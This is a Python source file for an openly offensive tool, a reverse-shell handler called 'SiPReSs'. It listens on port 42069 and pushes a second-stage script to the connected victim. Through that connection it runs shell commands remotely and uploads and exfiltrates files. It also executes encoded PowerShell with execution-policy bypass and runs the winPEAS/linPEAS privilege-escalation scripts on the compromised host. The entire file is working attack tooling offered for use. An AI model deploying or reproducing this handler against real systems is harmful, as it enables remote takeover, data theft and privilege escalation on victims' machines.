import base64
from hashlib import md5
import socket
import sys

from _pyrepl.console import InteractiveColoredConsole
from _pyrepl.simple_interact import run_multiline_interactive_console



# set sys.{ps1,ps2} just before invoking the interactive interpreter. This
# mimics what CPython does in pythonrun.c

class RemoteInteractiveColoredConsole(InteractiveColoredConsole):
    def __init__(self, port=42069):
        super().__init__(filename="REMOTE")
        self.socket = socket.socket()
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind(("", port))
        self.socket.listen()
        self.welcome()
        print(f"Waiting for connection on {port}")
        self.await_connection()

    def await_connection(self):
        self.connection, remote = self.socket.accept()
        print(f"Connection from {remote}")
        self.stdin = self.connection.makefile("w")
        self.stdout = self.connection.makefile("rb")
        print("Loading second stage")
        self.run_code_line("&run reverse_shell_second_stage.py")

    def remote_os_system_call(self,source):
        source = source.replace('"', '\\"')
        return f"os.system(\"\"\"{source[1:]}\"\"\")"

    def remote_powershell_call(self, powershell):
        return f"powershell.exe -ep bypass -enc {base64.b64encode(powershell.encode("utf-16le"))}"

    def special_command(self, source, filename, symbol):
        if source == "exit" or source == "quit":
            exit()
        elif source.startswith("upload"):
            #upload
            _, local_file, remote_file = source.split(" ")
            return self.upload_file(local_file, remote_file)
        elif source.startswith("download"):
            #download
            _, remote_file, local_file = source.split(" ")
            self.download_file(remote_file, local_file)
        elif source.startswith("run"):
            #run local file on remote
            _, local_file = source.split(" ")
            with open(local_file) as f:
                new_source = f.read()
            return new_source
        elif source.startswith("localrun"):
            #run local file
            _, local_file = source.split(" ")
            with open(local_file) as f:
                new_source = f.read()
            self.runsource_locally(new_source, filename, symbol)
        elif source.startswith("exe"):
            #run local binary on remote
            pass
        elif source.startswith("cmd"):
            # os.system from local file
            _, local_file = source.split(" ")
            with open(local_file) as f:
                new_source = f.read()
            return self.remote_os_system_call(new_source)
        elif source.startswith("ps"):
            # powershell from local file
            _, local_file = source.split(" ")
            with open(local_file) as f:
                powershell = f.read()
            new_source = self.remote_powershell_call(powershell)
            return self.remote_os_system_call(new_source)
        elif source.startswith("winpeas"):
            path = "/usr/share/peass/winpeas/winPEAS.ps1"
            with open(path) as f:
                powershell = f.read()
            new_source = self.remote_powershell_call(powershell)
            return self.remote_os_system_call(new_source)
        elif source.startswith("linpeas"):
            path = "/usr/share/peass/linpeas/linpeas.sh"
            with open(path) as f:
                bash = f.read()
            return self.remote_os_system_call(bash)


    def upload_file(self, local_file, remote_file):
        with open(local_file, "rb") as f:
            content = f.read()
        hashed = md5(content).hexdigest()
        content = base64.b64encode(content)
        source = f"""import base64\nfrom hashlib import md5\nwith open('{remote_file}', 'wb') as f:\n\tcontent=base64.b64decode({content})\n\tf.write(content)\n\tprint(md5(content).hexdigest()=='{hashed}')"""
        return source

    def download_file(self, remote_file, local_file):
        source = f"""import base64\nfrom hashlib import md5\nwith open('{remote_file}', 'rb') as f:\n\tcontent=base64.b64encode(f.read())\n\tprint(content.decode())"""
        self.stdin.write(source)
        self.stdin.write("\n\x04\n")
        self.stdin.flush()
        based_data = b""
        while self.stdout.peek():
            data = self.stdout.readline()
            if data == b"\x04\n" or data == b"\x04\r\n": break
            based_data+=data
        based_data = based_data.strip()
        data = base64.b64decode(based_data)
        with open(local_file, "wb") as f:
            f.write(data)

    def might_be_import(self, source):
        keywords = source.startswith("import") or (source.startswith("from") and "import" in source)
        only_one_statement = len(source.strip().split("\n")) < 2
        return keywords and only_one_statement

    def run_code_line(self, line):
        #run a line as if it was typed in the cli
        self.runsource(line, None, None)

    def runsource(self, source, filename, symbol):
        if source.startswith("$"):
            source = self.remote_os_system_call(source)
        elif source.startswith("%"):
            self.runsource_locally(source[1:], filename, symbol)
            return
        elif source.startswith("&"):
            source = self.special_command(source[1:], filename, symbol)
            if not source: return
        elif self.might_be_import(source):
            self.runsource_locally(source, filename, symbol)

        self.stdin.write(source)
        self.stdin.write("\n\x04\n")
        self.stdin.flush()
        while self.stdout.peek():
            data = self.stdout.readline()
            if data == b"\x04\n" or data == b"\x04\r\n": break
            print(data.decode().rstrip())

    def runsource_locally(self, source, filename, symbol):
        super().runsource(source, filename, symbol)

    def welcome(self):
        print("=" * 35)
        print("SiPReSs")
        print("Silly Python Reverse Shell by dotpy")
        print("="*35)
        print("This is a full remote python interpreter")
        print("If you get stuck try ctrl-c")
        print("CTRL-D or &exit or &quit TO EXIT - this should also kill the remote interpreter (eventually)")
        print("=" * 35)
        print("use $ to run os.system on the remote interpreter")
        print("try: $whoami")
        print("use % to use the LOCAL interpreter")
        print("try: %os.system('id')")
        print("use & for special commands")
        print("&exit to exit")
        print("&upload <local> <remote> to upload")
        print("&download <remote> <local> to download")
        print("&winpeas run winpeas from the local the kali path (/usr/share/peass/)")
        print("&linpeas run linpeas from the local the kali path (/usr/share/peass/)")
        print("&run <file> to run a local python file on remote")
        print("&localrun <file> to run a local python file locally")
        print("&exe <file> <args> to run a local binary on remote")
        print("&cmd <file> to run os.system from a local file on remote")
        print("&ps <file> to run a local powershell file on remote")
        print("=" * 35)
        print("")


    def kill_remote(self):
        print("Trying to kill remote shell - if this doesnt work it will die eventually from socket errors")
        self.runsource("import sys\nsys.exit()", None, None)

def reverse_shell_handler(local_port):
    if not hasattr(sys, "ps1"):
        sys.ps1 = ">>> "
    if not hasattr(sys, "ps2"):
        sys.ps2 = "... "

    console = RemoteInteractiveColoredConsole(local_port)
    try:
        run_multiline_interactive_console(console)
    finally:
        console.kill_remote()


if __name__ == "__main__":
    reverse_shell_handler(42069)